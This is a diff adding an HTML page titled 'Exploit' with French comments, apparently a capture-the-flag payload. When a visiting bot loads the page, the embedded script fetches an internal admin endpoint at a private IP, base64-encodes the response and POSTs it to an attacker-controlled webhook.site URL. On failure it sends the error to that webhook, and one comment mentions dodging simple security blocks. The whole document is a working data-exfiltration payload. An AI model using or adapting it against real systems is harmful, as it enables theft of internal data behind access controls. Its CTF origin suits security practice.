@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <script>
+        // Le bot arrive ici. On lance la requête vers l'admin du CTF.
+        fetch('http://192.168.132.208:9223/admin')
+            .then(response => response.text())
+            .then(data => {
+                // On t'envoie le résultat sur ton webhook
+                fetch('https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010', {
+                    method: 'POST',
+                    mode: 'no-cors', // Pour éviter les blocages de sécurité simples
+                    body: btoa(data) // On encode en base64 pour ne rien perdre
+                });
+            })
+            .catch(err => {
+                // Si ça rate, on envoie l'erreur pour savoir pourquoi
+                location.href = 'https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010?error=' + btoa(err);
+            });
+    </script>
+</body>
+</html>
